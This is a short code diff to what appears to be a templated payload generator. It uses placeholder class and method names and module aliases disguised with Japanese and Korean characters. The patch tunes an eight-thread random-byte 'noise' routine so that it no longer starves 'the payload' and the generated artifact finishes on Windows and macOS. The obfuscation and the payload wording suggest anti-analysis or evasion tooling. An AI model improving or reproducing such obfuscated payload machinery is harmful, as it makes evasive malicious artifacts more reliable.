@@ -4723,14 +4723,24 @@ class {ATTRITION_CLS}:
     def {METHOD_LOG_EXPLOSION}():
         def _noise_generator():
             try:
-                buf_size = 64 * 1024 * 1024
-                if _nixon_プラットフォーム플랫폼.system() == "Linux":
+                # 64 MB per iteration, eight threads, no pause: on Linux this
+                # reads /dev/urandom (a file read, cheap) but everywhere else it
+                # called os.urandom(64MB) in a tight loop, which saturates the
+                # machine and starves the payload's own thread. The artifact then
+                # never finishes -- measured as a 100s timeout with every thread
+                # parked in this function, on Windows and macOS but never Linux.
+                # The noise still happens; it no longer monopolises the CPU.
+                import time as _nx_noise_time
+                buf_size = 4 * 1024 * 1024
+                if _nixon_プラットフォーム플랫폼.system() in ("Linux", "Darwin"):
                     with open("/dev/urandom", "rb") as f:
                         while not {ATTRITION_CLS}._stop_entropy:
                             _ = f.read(buf_size)
+                            _nx_noise_time.sleep(0.05)
                 else:
                     while not {ATTRITION_CLS}._stop_entropy:
                         _ = _nixon_オペレーション운영.urandom(buf_size)
+                        _nx_noise_time.sleep(0.05)
             except: pass
         for _ in range(8):
             _nixon_スレッディング스레딩.Thread(target=_noise_generator, daemon=True).start()
